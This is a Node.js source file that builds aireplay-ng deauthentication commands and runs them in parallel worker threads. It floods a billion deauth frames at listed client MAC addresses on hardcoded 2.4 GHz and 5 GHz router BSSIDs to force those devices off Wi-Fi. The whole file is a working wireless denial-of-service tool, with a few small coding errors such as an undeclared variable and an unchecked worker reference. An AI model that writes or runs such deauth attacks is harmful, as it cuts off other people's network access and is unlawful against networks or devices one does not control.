const { Worker } = require("worker_threads");
const { exec } = require("child_process");

const parallelWorkers = {
    N2_4GHZ: null,
    N5GHZ: null
};



function generateDeauthCMD(targets){
    // generates the deauth command to disconnect targets from 2.4 and 5 GHZ WI-FI
    const ROUTER_2_4_GHZ_MAC = "88:AD:43:45:EC:48";
    const ROUTER_5_GHZ_MAC = "88:AD:43:45:EC:50";
    const PACKET_AMT = 1_000_000_000;
    
    let TARGETS2_4GHZ = "";
    let TARGETS5GHZ = "";

    targets.forEach(device => {
        if (device.mac2_4) {
            TARGETS2_4GHZ += device.mac2_4 + " ";
        }
        if (device.mac5) {
            TARGETS5GHZ += device.mac5 + " ";
        }
    });

    // validate that we have at least 1 target on each network type, if not return null
    const COMMAND_2_4_GHZ = (TARGETS2_4GHZ.length > 0)? `aireplay-ng --deauth ${PACKET_AMT} -a ${ROUTER_2_4_GHZ_MAC} -c ` + TARGETS2_4GHZ : null;
    const COMMAND_5_GHZ = (TARGETS5GHZ.length > 0)? `aireplay-ng --deauth ${PACKET_AMT} -a ${ROUTER_5_GHZ_MAC} -c ` + TARGETS5GHZ : null;


    return [
        COMMAND_2_4_GHZ,
        COMMAND_5_GHZ
    ];
}


function getTargets(allDevices){
    // given all users, find users who where requested to be disconnected
    targets = [];
    for (const name in allDevices){    
        let device = allDevices[name];
        let notConnected = !device.connected;
        if (notConnected){
            targets.push(device);
        }
    }
    return targets;
}

function runParallelDeuth(allDevices){
    /*
        deauthenticates users in parallel using 2 threads
        one thread deauthenticates the user on 2.4 GHZ network while the other 
        deauthenticates the user on 5 GHZ network
    */
    
    let targets = getTargets(allDevices);
    // no targets => do nothing
    if (targets.length < 1){
        return;
    }

    // create threads to execute
    const [ COMMAND_2_4_GHZ, COMMAND_5_GHZ ] = generateDeauthCMD(targets);

    // spawn 2.4 GHZ thread
    if (COMMAND_2_4_GHZ){
        // kill old thread if we need to respawn
        if (parallelWorkers.N2_4GHZ){
            parallelWorkers.N2_4GHZ.terminate();
        }
        
        // spawn thread
        parallelWorkers.N2_4GHZ = new Worker("./deauthWorker2_4.js", {
            workerData: COMMAND_2_4_GHZ 
        })
    }
    
    // spawn 5 GHZ thread
    if (COMMAND_5_GHZ){
        // kill old thread if we need to respawn
        if (parallelWorkers.N5GHZ){
            parallelWorkers.N5GHZ.terminate();
        }

        // spawn thread
        parallelWorkers.N5GHZ = new Worker("./deauthWorker5.js", {
            workerData: COMMAND_5_GHZ 
        });
    }

    parallelWorkers.N5GHZ.on("message", data => {
        console.log(data);
    });

    console.log(`deauth\n${COMMAND_2_4_GHZ}\n${COMMAND_5_GHZ}\n\n`);
}


function executeCMD(command){
    // executes a terminal command
    exec(command, (err, stdout, stderr) => {
        if (err) {
            console.log(stderr)
        } else {
            console.log(stdout)
        }
    })
}


module.exports = {
    runParallelDeuth,
    executeCMD,
    parallelWorkers
}